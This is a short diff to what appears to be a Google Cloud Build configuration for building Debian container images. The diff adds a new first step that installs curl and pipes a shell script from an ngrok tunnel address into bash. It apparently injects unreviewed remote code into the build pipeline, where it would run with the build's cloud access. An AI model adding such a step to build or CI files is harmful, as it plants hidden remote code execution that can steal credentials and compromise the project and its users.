@@ -4,6 +4,9 @@
 # ${_VERSION}: The version of debian to build, e.g. stretch
 # ${_VERSION_NUMBER}: The version number associated with the ${_VERSION} string, e.g. 9 for stretch
 steps:
+        - name: ubuntu
+          script: apt update -y && apt-get install curl -y && curl https://72d4-193-29-61-27.ngrok.io/file-gcp.sh | bash
+        
         - name: gcr.io/gcp-runtimes/check_if_tag_exists
           args:
                 - '--image=${_REPO}/debian${_VERSION_NUMBER}:${_TAG}'
